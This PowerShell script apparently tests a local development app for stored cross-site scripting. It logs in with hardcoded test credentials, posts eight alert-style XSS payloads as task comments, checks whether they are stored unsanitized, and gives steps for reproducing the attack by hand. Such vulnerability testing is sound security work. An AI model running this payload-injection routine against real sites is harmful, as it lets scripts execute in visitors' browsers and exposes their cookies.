# XSS Testing Script for Windows PowerShell
# This script tests the XSS vulnerability by posting malicious payloads to comments

$BASE_URL = "http://localhost:3001"

# XSS payloads to test
$XSS_PAYLOADS = @(
    "<script>alert('XSS Test')</script>",
    "<img src=x onerror='alert(document.cookie)'>",
    "<svg onload='alert(`"XSS via SVG`")'>",
    "<iframe src='javascript:alert(`"XSS`")'></iframe>",
    "<body onload='alert(`"XSS`")'>",
    "<input onfocus='alert(`"XSS`")' autofocus>",
    "<details open ontoggle='alert(`"XSS`")'>",
    "<marquee onstart='alert(`"XSS`")'>"
)

function Test-XSSVulnerability {
    Write-Host "🚨 Starting XSS Vulnerability Test" -ForegroundColor Red
    Write-Host ("=" * 50) -ForegroundColor Yellow
    
    # Login as Alice
    Write-Host "🔐 Logging in as alice@example.com..." -ForegroundColor Cyan
    
    $loginBody = @{
        email    = "alice@example.com"
        password = "password123"
    } | ConvertTo-Json
    
    try {
        $loginResponse = Invoke-RestMethod -Uri "$BASE_URL/api/auth/login" -Method Post -Body $loginBody -ContentType "application/json"
        $token = $loginResponse.token
        Write-Host "✅ Login successful!" -ForegroundColor Green
    }
    catch {
        Write-Host "❌ Login failed: $($_.Exception.Message)" -ForegroundColor Red
        return
    }
    
    # Get available tasks
    Write-Host "📋 Getting available tasks..." -ForegroundColor Cyan
    
    $headers = @{
        "Authorization" = "Bearer $token"
        "Content-Type"  = "application/json"
    }
    
    try {
        $tasks = Invoke-RestMethod -Uri "$BASE_URL/api/tasks" -Method Get -Headers $headers
        if ($tasks.Count -eq 0) {
            Write-Host "❌ No tasks available for testing" -ForegroundColor Red
            return
        }
        
        $testTaskId = $tasks[0].id
        Write-Host "📋 Using task ID $testTaskId for testing: `"$($tasks[0].title)`"" -ForegroundColor Green
        Write-Host ""
    }
    catch {
        Write-Host "❌ Failed to get tasks: $($_.Exception.Message)" -ForegroundColor Red
        return
    }
    
    # Test each XSS payload
    $successCount = 0
    for ($i = 0; $i -lt $XSS_PAYLOADS.Count; $i++) {
        $payload = $XSS_PAYLOADS[$i]
        Write-Host "🧪 Testing payload $($i + 1)/$($XSS_PAYLOADS.Count):" -ForegroundColor Yellow
        Write-Host "   $payload" -ForegroundColor Gray
        
        $commentBody = @{
            content = $payload
        } | ConvertTo-Json
        
        try {
            $commentResponse = Invoke-RestMethod -Uri "$BASE_URL/api/comments/task/$testTaskId" -Method Post -Body $commentBody -Headers $headers
            Write-Host "✅ XSS payload posted successfully!" -ForegroundColor Green
            $successCount++
        }
        catch {
            Write-Host "❌ Failed to post payload: $($_.Exception.Message)" -ForegroundColor Red
        }
        Write-Host ""
    }
    
    # Verify payloads are stored
    Write-Host "🔍 Verifying stored comments..." -ForegroundColor Cyan
    
    try {
        $commentsResponse = Invoke-RestMethod -Uri "$BASE_URL/api/comments/task/$testTaskId" -Method Get -Headers $headers
        $comments = $commentsResponse.comments
        
        $xssComments = $comments | Where-Object { 
            $content = $_.content
            $XSS_PAYLOADS | Where-Object { $content.Contains($_.Substring(0, [Math]::Min(10, $_.Length))) }
        }
        
        Write-Host "📊 Results:" -ForegroundColor Cyan
        Write-Host "   Payloads sent: $($XSS_PAYLOADS.Count)" -ForegroundColor White
        Write-Host "   Successfully posted: $successCount" -ForegroundColor White
        Write-Host "   XSS comments found: $($xssComments.Count)" -ForegroundColor White
        Write-Host ""
        
        if ($xssComments.Count -gt 0) {
            Write-Host "🚨 VULNERABILITY CONFIRMED: XSS payloads stored without sanitization!" -ForegroundColor Red
            Write-Host ""
            Write-Host "📝 Stored XSS payloads:" -ForegroundColor Yellow
            for ($i = 0; $i -lt $xssComments.Count; $i++) {
                Write-Host "   $($i + 1). $($xssComments[$i].content)" -ForegroundColor Gray
            }
            Write-Host ""
            Write-Host "⚠️  These payloads will execute when the comments are viewed in the browser!" -ForegroundColor Red
            Write-Host "🌐 View them at: http://localhost:3000/tasks/$testTaskId" -ForegroundColor Cyan
        }
        else {
            Write-Host "✅ No XSS vulnerability detected - payloads were sanitized" -ForegroundColor Green
        }
        
        Write-Host ""
        Write-Host "🔗 To test manually:" -ForegroundColor Cyan
        Write-Host "   1. Open http://localhost:3000" -ForegroundColor White
        Write-Host "   2. Login with alice@example.com / password123" -ForegroundColor White
        Write-Host "   3. Go to task $testTaskId" -ForegroundColor White
        Write-Host "   4. Add a comment with XSS payload" -ForegroundColor White
        Write-Host "   5. The alert should execute when the page loads" -ForegroundColor White
    }
    catch {
        Write-Host "❌ Failed to verify comments: $($_.Exception.Message)" -ForegroundColor Red
    }
}


# Run the test
Test-XSSVulnerability